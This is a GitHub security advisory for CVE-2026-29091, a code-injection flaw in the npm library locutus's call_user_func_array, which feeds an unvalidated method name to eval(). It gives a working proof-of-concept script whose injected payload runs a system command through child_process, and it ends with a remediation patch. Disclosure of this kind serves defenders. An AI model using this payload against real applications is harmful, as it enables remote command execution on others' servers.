# [H] locutus call_user_func_array vulnerable to Remote Code Execution (RCE) due to Code Injection

## Summary
Severity: High
Advisory: GHSA-fp25-p6mj-qqg6
CVE: CVE-2026-29091
CWE: CWE-95
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-04
Source: https://github.com/advisories/GHSA-fp25-p6mj-qqg6
Type: github-advisory

## Affected
- npm: `locutus` — affected >=0 <3.0.0

## Details
### Details

A Remote Code Execution (RCE) flaw was discovered in the `locutus` project (v2.0.39), specifically within the `call_user_func_array` function implementation. The vulnerability allows an attacker to inject arbitrary JavaScript code into the application's runtime environment. This issue stems from an insecure implementation of the `call_user_func_array` function (and its wrapper `call_user_func`), which fails to properly validate all components of a callback array before passing them to `eval()`.

------

### Technical Details

The vulnerability is in the `call_user_func_array` function in `src/php/funchand/call_user_func_array.js`, between lines 31 and 35 of version 2.0.39. This function mimics PHP's dynamic function call feature and accepts a callback argument, which can be a string (function name) or an array (class and method name).

The developers applied a regular expression check (`validJSFunctionNamePattern`) to the first array element (the class identifier), but not to the second element (the method identifier). As a result, the code inserts the user-supplied method name directly into the evaluation string: `func = eval(cb[0] + "['" + cb[1] + "']")`. This oversight allows an attacker to craft a payload in the second element that escapes the property access context, injects arbitrary JavaScript commands, and executes them with the full privileges of the Node.js process.

``````javascript
// src/php/funchand/call_user_func_array.js (Lines 31-35)

if (cb[0].match(validJSFunctionNamePattern)) {
  // biome-ignore lint/security/noGlobalEval: needed for PHP port
  func = eval(cb[0] + "['" + cb[1] + "']")
}
``````

-----

### PoC

This PoC loads the vulnerable call_user_func_array implementation from Locutus and supplies a crafted callback argument that breaks out of the internal eval. The injected payload executes a system command and forces the function to fail validation, causing the command output to surface in the error message.

``````go
const path = require("path");
const fs = require("fs");

const vulnFilePath = path.resolve(
  __dirname,
  "./src/php/funchand/call_user_func_array.js"
);

if (!fs.existsSync(vulnFilePath)) {
  console.error("error target file not found");
  process.exit(1);
}

console.log("loading target");
const call_user_func_array = require(vulnFilePath);

const payload = "']; require('child_process').execSync('id').toString().trim(); //";

console.log("payload set");

try {
  console.log("run");
  call_user_func_array(["Date", payload], []);
  console.log("fail no error");
} catch (e) {
  const msg = e.message;
  if (msg && msg.includes("uid=")) {
    console.log("pwn");
    const proof = msg.split(" is not a valid function")[0];
    console.log("out " + proof);
  } else {
    console.error("fail unexpected");
    console.error(msg);
    process.exit(1);
  }
}
``````

-----

### Impact

If exploited, this issue allows attackers to execute arbitrary JavaScript code in the Node.js process. It occurs when applications pass untrusted array callbacks to call_user_func_array(), a practice common in JSON-RPC setups and PHP-to-JavaScript porting layers. Since the library fails to properly sanitize inputs, this is considered a supplier defect rather than an integration error.

This flaw has been exploited in practice, but it is not a "drive-by" vulnerability. It only arises when an application serves as a gateway or router using Locutus functions.

Finally, if an attacker can control `cb[0]` without regex constraints, they could use `global` or `process` directly. However, Locutus protects `cb[0]`. This `cb[1]` injection is the *_only_* way to bypass the intended security controls of the library. It is a "bypass" of the library's own protection.

------

### Remediation

Update the loop to capture the value correctly or use the index to reference the slice directly.

``````go
// src/php/funchand/call_user_func_array.js (Lines 31-35)

if (typeof cb[0] === "string") {
  if (cb[0].match(validJSFunctionNamePattern)) {
    // biome-ignore lint/security/noGlobalEval: needed for PHP port
    // func = eval(cb[0] + "['" + cb[1] + "']");
    var obj = null;
    try {
      obj = eval(cb[0]);
    } catch (e) {}
    if (obj && typeof obj[cb[1]] === "function") {
      func = obj[cb[1]];
    }
  }
} else {
  func = cb[0][cb[1]];
}
return func.apply(null, parameters);
``````

And maybe after a better remediations is refactor `call_user_func_array` to resolve global objects using `global[cb[0]]` or `window[cb[0]]`.

----

### Resources
https://cwe.mitre.org/data/definitions/95.html

https://github.com/locutusjs/locutus/blob/main/src/php/funchand/call_user_func_array.js#L31

https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_eval!

-----

**Author**: Tomas Illuminati

## References
- https://github.com/locutusjs/locutus/security/advisories/GHSA-fp25-p6mj-qqg6
- https://nvd.nist.gov/vuln/detail/CVE-2026-29091
- https://github.com/locutusjs/locutus/commit/977a1fb169441e35996a1d2465b512322de500ad
- https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_eval
- https://github.com/locutusjs/locutus
- https://github.com/locutusjs/locutus/blob/main/src/php/funchand/call_user_func_array.js#L31
